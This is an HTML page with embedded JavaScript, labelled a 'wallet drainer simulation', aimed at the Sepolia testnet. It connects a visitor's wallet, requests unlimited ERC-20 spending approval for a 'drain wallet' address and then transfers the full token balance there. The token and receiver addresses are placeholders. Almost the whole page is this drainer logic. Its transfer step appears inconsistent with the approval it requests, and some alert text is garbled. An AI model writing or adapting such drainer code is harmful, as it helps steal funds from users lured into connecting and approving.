<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Wallet Drainer Simulation</title>
  <script src="https://unpkg.com/@walletconnect/web3modal@2.7.2/dist/index.umd.js"></script>
  <script src="https://unpkg.com/ethers@6.6.2/dist/ethers.umd.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0f0f0f;
      color: white;
      text-align: center;
      padding: 40px;
    }
    button {
      background: #1e90ff;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>Simulated Token Drainer</h1>
  <button id="connectBtn">Connect Wallet</button>

  <script type="module">
    import { EthereumProvider } from "https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.3";

    const projectId = "f50fd9a8234e03fc76d81243b2d56b65"; // Public WalletConnect v2 project ID
    const tokenAddress = "0xYourTestnetTokenAddress"; // Replace with testnet ERC-20 address
    const receiverAddress = "0xReceiverWalletAddress"; // Replace with your drain wallet address

    let provider;
    let signer;

    async function connectWallet() {
      provider = await EthereumProvider.init({
        projectId,
        chains: [11155111], // Sepolia
        showQrModal: true,
      });

      await provider.enable();

      const ethersProvider = new ethers.BrowserProvider(provider);
      signer = await ethersProvider.getSigner();

      alert(`Connected: ${await signer.getAddress()}`);
      await approveToken();
    }

    async function approveToken() {
      const erc20 = new ethers.Contract(tokenAddress, [
        "function approve(address spender, uint256 amount) public returns (bool)"
      ], signer);

      const tx = await erc20.approve(receiverAddress, ethers.MaxUint256);
      await tx.wait();
      alert("âœ… Approved token spending!");

      await drainTokens();
    }

    async function drainTokens() {
      const erc20 = new ethers.Contract(tokenAddress, [
        "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
        "function balanceOf(address account) public view returns (uint256)"
      ], signer);

      const from = await signer.getAddress();
      const balance = await erc20.balanceOf(from);

      const tx = await erc20.transferFrom(from, receiverAddress, balance);
      await tx.wait();

      alert(`ðŸ’¸ Drained ${ethers.formatUnits(balance)} tokens to ${receiverAddress}`);
    }

    document.getElementById("connectBtn").onclick = connectWallet;
  </script>
</body>
</html>
